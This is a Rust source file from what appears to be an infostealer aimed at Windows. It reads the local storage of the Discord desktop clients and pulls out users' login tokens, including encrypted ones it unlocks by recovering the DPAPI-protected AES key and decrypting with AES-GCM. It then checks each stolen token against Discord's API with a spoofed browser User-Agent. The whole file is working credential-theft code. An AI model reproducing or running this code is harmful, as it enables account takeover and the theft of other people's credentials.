// language: Rust, file: src/discord.rs, target: Windows
// Grab Discord tokens from the desktop client's LevelDB local storage, including
// DPAPI-wrapped AES-GCM encrypted tokens (dQw4w9WgXcQ: prefix).
#![cfg(windows)]
#![allow(dead_code)]
use crate::win_crypto::{aes_gcm_decrypt, dpapi_unprotect};
use base64::Engine;
use regex::Regex;
use std::path::PathBuf;

fn leveldb_dirs() -> Vec<PathBuf> {
    let roam = std::env::var("APPDATA").unwrap_or_default();
    let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
    [
        "discord",
        "discordcanary",
        "discordptb",
        "Discord",
        "discorddevelopment",
    ]
    .iter()
    .flat_map(|d| {
        [
            PathBuf::from(&roam).join(d).join("Local Storage").join("leveldb"),
            PathBuf::from(&local).join(d).join("Local Storage").join("leveldb"),
        ]
    })
    .collect()
}

fn read_leveldb(dir: &PathBuf) -> Vec<u8> {
    let mut buf = Vec::new();
    if let Ok(rd) = std::fs::read_dir(dir) {
        for e in rd.flatten() {
            let p = e.path();
            if let Some(ext) = p.extension().and_then(|s| s.to_str()) {
                if ext.eq_ignore_ascii_case("ldb") || ext.eq_ignore_ascii_case("log") {
                    if let Ok(mut b) = std::fs::read(&p) {
                        buf.append(&mut b);
                    }
                }
            }
        }
    }
    buf
}

/// Find the AES master key: the LevelDB `key` entry is base64 of a DPAPI blob.
fn master_key(raw: &[u8]) -> Option<Vec<u8>> {
    let text = String::from_utf8_lossy(raw);
    let re = Regex::new(r"AQAAAA[A-Za-z0-9+/=]{60,}").ok()?;
    for m in re.find_iter(&text) {
        if let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(m.as_str()) {
            if let Some(k) = dpapi_unprotect(&blob) {
                if k.len() == 32 {
                    return Some(k);
                }
            }
        }
    }
    None
}

pub fn grab() -> Vec<String> {
    let mut tokens = Vec::new();
    for dir in leveldb_dirs() {
        if !dir.exists() {
            continue;
        }
        let raw = read_leveldb(&dir);
        if raw.is_empty() {
            continue;
        }
        let text = String::from_utf8_lossy(&raw).to_string();

        let plain = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}").unwrap();
        for m in plain.find_iter(&text) {
            tokens.push(m.as_str().to_string());
        }
        let mfa = Regex::new(r"mfa\.[\w-]{84}").unwrap();
        for m in mfa.find_iter(&text) {
            tokens.push(m.as_str().to_string());
        }

        let enc = Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)").unwrap();
        if let Some(key) = master_key(&raw) {
            for cap in enc.captures_iter(&text) {
                if let Ok(blob) = base64::engine::general_purpose::STANDARD.decode(&cap[1]) {
                    // dQw4w9WgXcQ payloads: nonce(12) || ciphertext || tag(16)
                    if let Some(plain) = aes_gcm_decrypt(&key, &blob) {
                        if let Ok(s) = String::from_utf8(plain) {
                            tokens.push(s);
                        }
                    }
                }
            }
        }
    }
    tokens.sort();
    tokens.dedup();
    tokens
}

/// Validate a token against the Discord API; returns "user#disc (id)" or None.
pub async fn validate(client: &reqwest::Client, token: &str) -> Option<String> {
    let r = client
        .get("https://discord.com/api/v9/users/@me")
        .header("Authorization", token)
        .header("User-Agent", "Mozilla/5.0")
        .send()
        .await
        .ok()?;
    if !r.status().is_success() {
        return None;
    }
    let v: serde_json::Value = r.json().await.ok()?;
    let u = v["username"].as_str().unwrap_or("?");
    let d = v["discriminator"].as_str().unwrap_or("0");
    let id = v["id"].as_str().unwrap_or("?");
    Some(format!("{u}#{d} ({id})"))
}
